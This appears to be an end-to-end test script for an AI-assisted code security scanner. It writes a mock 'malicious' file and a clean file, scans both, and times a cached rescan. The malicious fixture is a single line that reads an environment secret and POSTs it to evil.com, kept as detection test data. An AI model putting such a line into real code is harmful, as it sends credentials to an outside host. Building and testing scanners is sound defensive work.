import { VanguardScanner } from '../lib/services/scanner.js';
import { IntelligenceEngine } from '../lib/services/intelligence.js';
import { CacheManager } from '../lib/utils/cache.js';
import config from '../lib/utils/config.js';
import chalk from 'chalk';
import fs from 'fs/promises';
import path from 'path';

/**
 * Enterprise Simulation: End-to-End Verification
 */
async function runSimulation() {
  console.log(chalk.bold.bgMagenta.white(' 🚀 VANGUARD ENTERPRISE SIMULATION '));

  // 1. Setup Mock Environment
  const mockRepo = path.join(process.cwd(), '.vanguard_sim');
  await fs.mkdir(mockRepo, { recursive: true });

  const maliciousFile = path.join(mockRepo, 'utils.js');
  const cleanFile = path.join(mockRepo, 'index.js');

  await fs.writeFile(
    maliciousFile,
    '// Malicious payload\nconst secret = process.env.KEY;\nfetch("https://evil.com", { method: "POST", body: secret });'
  );
  await fs.writeFile(cleanFile, 'console.log("Hello, Secure World!");');

  console.log(chalk.blue('  ✔ Mock repository prepared.'));

  // 2. Initialize Engines
  const originalProvider = config.get('AI_PROVIDER');
  config.set('AI_PROVIDER', 'ollama');

  if (!config.get('OLLAMA_MODEL')) {
    config.set('OLLAMA_MODEL', 'qwen2.5:7b');
  }

  const intel = new IntelligenceEngine(true);
  const context = await intel.sync();
  const scanner = new VanguardScanner(null, context);

  console.log(chalk.blue('  ✔ Hybrid Intelligence context built.'));

  // 3. Round 1: Cold Scan (No Cache)
  console.log(chalk.yellow('\n--- ROUND 1: Cold Scan ---'));
  let start = Date.now();

  const res1 = await scanner.scan('utils.js', await fs.readFile(maliciousFile, 'utf-8'));
  const res2 = await scanner.scan('index.js', await fs.readFile(cleanFile, 'utf-8'));

  if (res2.verdict === 'SAFE')
    CacheManager.save('index.js', await fs.readFile(cleanFile, 'utf-8'), 'SAFE');

  console.log(
    `  Audit 1 (Malicious): ${res1.verdict === 'BLOCK' ? chalk.red('BLOCK') : chalk.green('SAFE')}`
  );
  console.log(
    `  Audit 2 (Clean): ${res2.verdict === 'SAFE' ? chalk.green('SAFE') : chalk.red('BLOCK')}`
  );
  console.log(`  Cold Execution Time: ${Date.now() - start}ms`);

  // 4. Round 2: Cached Scan (Should be < 10ms)
  console.log(chalk.yellow('\n--- ROUND 2: Warm Scan (Cached) ---'));
  start = Date.now();

  const content2 = await fs.readFile(cleanFile, 'utf-8');
  const cached = CacheManager.check('index.js', content2);

  if (cached) {
    console.log(`  Audit 2 (Clean): ${chalk.green('SAFE (CACHED)')}`);
  }
  console.log(`  Warm Execution Time: ${Date.now() - start}ms`);

  // 5. Cleanup
  config.set('AI_PROVIDER', originalProvider);
  await fs.rm(mockRepo, { recursive: true, force: true });
  console.log(chalk.green('\n🏁 Simulation Finished Successfully.'));
}

runSimulation();
